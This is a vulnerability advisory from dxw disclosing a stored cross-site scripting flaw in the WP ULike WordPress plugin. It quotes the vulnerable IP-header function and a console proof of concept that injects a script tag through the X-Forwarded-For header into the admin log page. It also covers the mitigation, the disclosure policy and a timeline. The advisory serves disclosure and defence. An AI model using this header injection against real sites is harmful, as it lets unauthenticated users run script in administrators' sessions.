================
Software: WP ULike
Version: 2.8.1,3.1
Advisory report: https://advisories.dxw.com/advisories/stored-xss-wp-ulike/
CVE: Awaiting assignment
CVSS: 6.4 (Medium; AV:N/AC:L/Au:N/C:P/I:P/A:N)

Description
================
Stored XSS in WP ULike allows unauthorised users to do almost anything an admin can

Vulnerability
================
        function wp_ulike_get_real_ip() {
                if (getenv(\&#039;HTTP_CLIENT_IP\&#039;)) {
                        $ip = getenv(\&#039;HTTP_CLIENT_IP\&#039;);
                } elseif (getenv(\&#039;HTTP_X_FORWARDED_FOR\&#039;)) {
                        $ip = getenv(\&#039;HTTP_X_FORWARDED_FOR\&#039;);
                } elseif (getenv(\&#039;HTTP_X_FORWARDED\&#039;)) {
                        $ip = getenv(\&#039;HTTP_X_FORWARDED\&#039;);
                } elseif (getenv(\&#039;HTTP_FORWARDED_FOR\&#039;)) {
                        $ip = getenv(\&#039;HTTP_FORWARDED_FOR\&#039;);
                } elseif (getenv(\&#039;HTTP_FORWARDED\&#039;)) {
                        $ip = getenv(\&#039;HTTP_FORWARDED\&#039;);
                } else {
                        $ip = $_SERVER[\&#039;REMOTE_ADDR\&#039;];
                }

                return $ip;
        }
This will be incorrect in many situations. The header (which could be an IP address, or it could be an arbitrary string provided by the user) is stored in the database. Then itas displayed to the admin without being escaped.

Proof of concept
================

Enable the plugin
Sign out
Visit a post displaying a like button
Open the console
Paste and execute this: var d=document.querySelector(\&#039;.wpulike-default a\&#039;).dataset;jQuery.ajax(\&#039;/wp-admin/admin-ajax.php\&#039;, {method: \&#039;POST\&#039;, headers: {\&#039;X-Forwarded-For\&#039;: \&#039;<script>alert(1)</script>\&#039;},data: {action: \&#039;wp_ulike_process\&#039;, id: d.ulikeId, status: d.ulikeStatus, type: d.ulikeType, nonce: d.ulikeNonce}})
Sign in
Visit /wp-admin/admin.php?page=wp-ulike-post-logs


Mitigations
================
Upgrade to version 3.2 or later.

Disclosure policy
================
dxw believes in responsible disclosure. Your attention is drawn to our disclosure policy: https://security.dxw.com/disclosure/


This vulnerability will be published if we do not receive a response to this report with 14 days.

Timeline
================

2017-10-18: Discovered
2018-04-16: Reported to plugin author via contact form
2018-04-23: Vendor reported fixed in 3.2 (first reply)

